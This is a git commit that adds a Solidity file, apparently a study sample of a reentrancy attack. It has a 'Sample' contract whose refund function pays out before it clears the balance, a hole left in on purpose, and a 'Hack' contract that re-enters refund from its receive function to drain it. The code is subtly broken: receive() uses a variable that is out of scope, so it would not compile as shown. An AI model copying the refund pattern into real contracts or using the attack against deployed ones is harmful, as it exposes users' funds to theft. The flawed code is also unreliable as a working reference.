d22ddb1370da749b797a56ef089a3f13724302ca
magistrigusti <47912728+magistrigusti@users.noreply.github.com>
2024-12-09 00:44:16 +0200

    0.9b1

---
+++ contracts/conractsArray/Reentranse.sol
@@ -0,0 +1,22 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Sample {
+  mapping(address => uint) refunds;
+
+  function refund() external {
+    (bool ok,) = msg.sender.call{value: refunds[msg.sender]}("");
+    require(ok);
+    refunds[msg.sender] = 0;
+  }
+}
+
+contract Hack {
+  function hack(Sample _toHack) external {
+    _toHack.refund();
+  }
+
+  receive() external payable {
+    _toHack.refund();
+  }
+}
